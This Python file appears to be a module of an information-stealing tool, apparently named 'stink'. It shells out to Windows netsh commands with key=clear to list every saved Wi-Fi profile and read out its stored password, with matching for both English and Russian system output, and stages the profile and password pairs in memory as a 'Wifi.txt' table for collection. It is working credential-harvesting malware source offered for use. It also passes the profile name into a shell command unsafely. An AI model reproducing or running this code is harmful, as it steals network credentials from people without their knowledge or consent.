import subprocess
from os import path
from typing import List

from chardet import detect as chardet_detect

from stink.helpers import functions, MemoryStorage


class Wifi:
    def __init__(self, folder: str):
        self.__file = path.join(folder, "Wifi.txt")
        self.__storage = MemoryStorage()

    @staticmethod
    def decode_text(text):
        return text.decode(encoding=chardet_detect(text)["encoding"], errors="ignore")

    @staticmethod
    def get_wifi_profiles() -> List[str]:
        def decode_text(text):
            return text.decode(
                encoding=chardet_detect(text)["encoding"], errors="ignore"
            )

        def _any(cmd_result):
            KEY_CONTENT = ["All User Profile", "Все профили пользователей"]
            return any(keyword in cmd_result for keyword in KEY_CONTENT)

        process = subprocess.Popen(
            "netsh wlan show profiles", shell=True, stdout=subprocess.PIPE
        )
        output, _ = process.communicate()
        cmd_results = decode_text(output).split("\r\n")
        profiles = [
            cmd_result.split(": ")[-1] for cmd_result in cmd_results if _any(cmd_result)
        ]
        return profiles

    @staticmethod
    def extract_wifi_password(profile: str) -> str:
        def decode_text(text):
            return text.decode(
                encoding=chardet_detect(text)["encoding"], errors="ignore"
            )

        def _any(cmd_result):
            KEY_CONTENT = ["Key Content", "Содержимое ключа"]
            return any(keyword in cmd_result for keyword in KEY_CONTENT)

        process = subprocess.Popen(
            f'netsh wlan show profile "{profile}" key=clear',
            shell=True,
            stdout=subprocess.PIPE,
        )
        output, _ = process.communicate()
        cmd_results = decode_text(output).split("\r\n")
        password = [
            cmd_result.split(":")[1][:]
            for cmd_result in cmd_results
            if _any(cmd_result)
        ]
        if len(password) == 1:
            return password[0]

    def __get_wifi_profiles(self) -> None:
        profiles = self.get_wifi_profiles()
        wifi_data = []
        for profile in profiles:
            password = self.extract_wifi_password(profile)
            if password:
                wifi_data.append([profile, password])

        self.__storage.add_from_memory(
            self.__file,
            "\n".join(
                line for line in functions.create_table(["Wifi", "Password"], wifi_data)
            ),
        )

    def run(self) -> List:
        try:
            self.__get_wifi_profiles()
            return self.__storage.get_data()
        except Exception as e:
            print(f"[Wifi]: {repr(e)}")
